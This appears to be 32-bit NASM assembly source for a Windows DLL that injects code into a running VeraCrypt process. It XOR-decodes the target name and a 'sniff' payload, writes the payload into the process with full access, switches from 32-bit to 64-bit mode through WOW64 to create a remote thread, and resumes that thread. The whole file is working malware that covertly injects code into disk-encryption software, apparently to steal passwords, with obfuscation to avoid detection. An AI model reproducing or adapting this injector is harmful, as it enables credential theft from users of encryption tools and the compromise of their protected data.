default rel

section .text
global DllMain

global migrate
export migrate

%include '..\utils_32_text.asm'

migrate:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = kernel mod handle
    ; ebp - 12 = payload mem
    ; ebp - 16 = target proc id
    ; ebp - 20 = target proc hnd
    ; ebp - 24 = dwOldProtect
    ; ebp - 28 = execute64 code
    ; ebp - 32 = x64function code
    ; ebp - 36 = ptr to wow64 ctx
    sub esp, 36                         ; allocate local variables space

    mov dword [ebp - 4], 0              ; return value

    call get_kernel_module_handle

    cmp eax, 0                          ; kernel not found ?
    je .shutdown

    mov [ebp - 8], eax                  ; kernel handle

    push dword [ebp - 8]                ; kernel handle
    call populate_kernel_function_ptrs_by_name

    push xor_key.len
    push xor_key
    push veracrypt_xor.len
    push veracrypt_xor
    call my_xor

.loop:
    push veracrypt_xor.len
    push veracrypt_xor
    call find_target_process_id

    cmp eax, 0                          ; processe not found ?
    jne .loop_end

    push dword 5000                     ; milliseconds to sleep for
    call [sleep]

    jmp .loop

.loop_end:
    mov [ebp - 16], eax                 ; target proc id

    ; open the target process
    push dword [ebp - 16]               ; target proc id
    push dword 0
    push PROCESS_ALL_ACCESS
    call [open_process]                 ; target proc hnd

    cmp eax, INVALID_HANDLE_VALUE       ; target proc hnd invalid ?
    je .shutdown

    mov [ebp - 20], eax                 ; target proc hnd

    ; Allocate memory in the target process
    push PAGE_READWRITE
    mov eax, MEM_RESERVE
    or eax, MEM_COMMIT
    push eax
    push sniff_data_xor.len
    push dword 0
    push dword [ebp - 20]               ; target proc hnd
    call [virtual_alloc_ex]             ; payload mem

    cmp eax, 0                          ; is mem == 0 ?
    je .shutdown

    mov [ebp - 12], eax                 ; payload mem

    ; UnXor payload before writing it to the memory in target process
    push xor_key.len
    push xor_key
    push sniff_data_xor.len
    push sniff_data_xor
    call my_xor

    ; Write the sniff payload to the memory in target process
    push dword 0
    push sniff_data_xor.len
    push sniff_data_xor
    push dword [ebp - 12]               ; payload mem
    push dword [ebp - 20]               ; target proc hnd
    call [write_process_memory]

    cmp eax, 0                          ; did write fail ?
    je .shutdown

    ; Change the protection to EXECUTE_READ
    mov eax, ebp
    sub eax, 24
    push eax                            ; &dwOldProtect
    push PAGE_EXECUTE_READ
    push sniff_data_xor.len
    push dword [ebp - 12]               ; payload mem
    push dword [ebp - 20]               ; target proc id
    call [virtual_protect_ex]

    cmp eax, 0                          ; did virtual protect fail ?
    je .shutdown

    ; Allocate memory in the current process for execute64
    push PAGE_READWRITE
    mov eax, MEM_RESERVE
    xor eax, MEM_COMMIT
    push eax
    push execute64_data_xor.len
    push dword 0
    call [virtual_alloc]

    cmp eax, 0                          ; did virtual alloc fail ?
    je .shutdown

    mov [ebp - 28], eax                 ; execute64 mem

    ; UnXor execute64 data before copying it to the memory
    push xor_key.len
    push xor_key
    push execute64_data_xor.len
    push execute64_data_xor
    call my_xor

    ; Copy the function code to the memory
    push execute64_data_xor.len
    push dword [ebp - 28]               ; execute64 mem
    push execute64_data_xor
    call memcpy

    ; change the protection to execute_read
    mov eax, ebp
    sub eax, 24
    push eax                            ; &dwOldProtect
    push PAGE_EXECUTE_READ
    push execute64_data_xor.len
    push dword [ebp - 28]               ; execute64 mem
    call [virtual_protect]

    cmp eax, 0                          ; did virtual protect fail ?
    je .shutdown

    ; allocate memory for x64function
    push PAGE_READWRITE
    mov eax, MEM_RESERVE
    or eax, MEM_COMMIT
    push eax
    mov eax, wownative_data_xor.len
    add eax, 32                         ; wownative + wow64context
    push eax
    push dword 0
    call [virtual_alloc]

    cmp eax, 0                          ; did virtual alloc fail ?
    je .shutdown

    mov [ebp - 32], eax                 ; x64function mem

    ; UnXor x64function data before copying it to the memory
    push xor_key.len
    push xor_key
    push wownative_data_xor.len
    push wownative_data_xor
    call my_xor

    ; copy the function code to the memory
    push wownative_data_xor.len
    push dword [ebp - 32]               ; x64function mem
    push wownative_data_xor
    call memcpy

    ; change the protection of the memory
    mov eax, ebp
    sub eax, 24                         ; &dwOldProtect
    push eax
    push PAGE_EXECUTE_READWRITE
    mov eax, wownative_data_xor.len
    add eax, 32                         ; wownative + wow64context(32 bytes)
    push eax
    push dword [ebp - 32]               ; x64function mem
    call [virtual_protect]

    cmp eax, 0                          ; did virtual protect fail ?
    je .shutdown

    ; setup context in the allocated mem
    mov eax, [ebp - 32]                 ; x64function mem
    add eax, wownative_data_xor.len     ; addr of the wow64 context

    mov [ebp - 36], eax                 ; ptr to wow64 ctx

    mov edx, [ebp - 20]
    mov [eax], edx                      ; target proc hnd

    mov edx, [ebp - 12]                 ; payload mem
    mov [eax + 8], edx

    mov dword [eax + 16], 0
    mov dword [eax + 24], 0

    ; make the jump from 32 bit to 64 bit
    push dword [ebp - 36]               ; ptr to wow64 ctx
    push dword [ebp - 32]               ; x64function
    call [ebp - 28]                     ; execute64

    mov eax, [ebp - 36]                 ; ptr to wow64 ctx
    add eax, 24                         ; ctx->t.hThread

    cmp dword [eax], 0                  ; is hThread == 0 ?
    je .shutdown

    ; resume the thread, since it is created in suspended mode
    push dword [eax]
    call [resume_thread]

.shutdown:
    mov eax, 0                          ; return value

    add esp, 36                         ; free local variables space

    leave
    ret

; arg0: hInstance       ebp + 8
; arg1: dwReason        ebp + 12
; arg2: reserved        ebp + 16
;
; return: BOOL          eax
DllMain:
    push ebp
    mov ebp, esp

    cmp dword [ebp + 12], 1         ; PROCESS ATTACH
    jne .continue_from_process_attach

    jmp .shutdown

.continue_from_process_attach:
    cmp dword [ebp + 12], 0         ; PROCESS DETACH
    jne .continue_from_process_detach

    jmp .shutdown

.continue_from_process_detach:
.shutdown:
    mov eax, 1

    add esp, 12                     ; free arg stack

    leave
    ret


section .data
veracrypt_xor: db 0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x55, 0x48, 0x55, 0x0
.len equ $ - veracrypt_xor - 1

%include '../sniff/sniff.bin.asm'
%include 'execute64.bin.asm'
%include 'wownative.bin.asm'
%include '../utils_32_data.asm'

section .bss